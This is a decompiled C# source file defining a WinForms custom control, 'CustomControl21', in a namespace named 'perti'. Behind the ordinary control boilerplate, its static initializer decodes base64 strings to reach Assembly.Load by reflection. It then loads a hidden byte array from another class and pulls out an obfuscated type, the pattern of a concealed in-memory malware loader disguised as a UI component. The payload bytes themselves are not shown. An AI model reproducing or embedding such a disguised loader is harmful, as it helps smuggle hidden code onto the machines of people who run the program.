using System;
using System.ComponentModel;
using System.Reflection;
using System.Windows.Forms;

namespace perti;

public class CustomControl21 : Control
{
	internal delegate Assembly LoadAssembly(byte[] data);

	private static readonly string Miau = CustomControl36.Def(CustomControl4.D("TG9hZA=="));

	internal static Type Instance = ((LoadAssembly)Delegate.CreateDelegate(typeof(LoadAssembly), typeof(Assembly).GetMethod(Miau, new Type[1] { typeof(byte[]) })))(CustomControl29.Egty()).GetType(CustomControl36.Def(CustomControl4.D("UmV0ZS5VaXRl")));

	private IContainer components;

	public CustomControl21()
	{
		InitializeComponent();
	}

	protected override void OnPaint(PaintEventArgs pe)
	{
		((Control)this).OnPaint(pe);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Control)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
	}
}
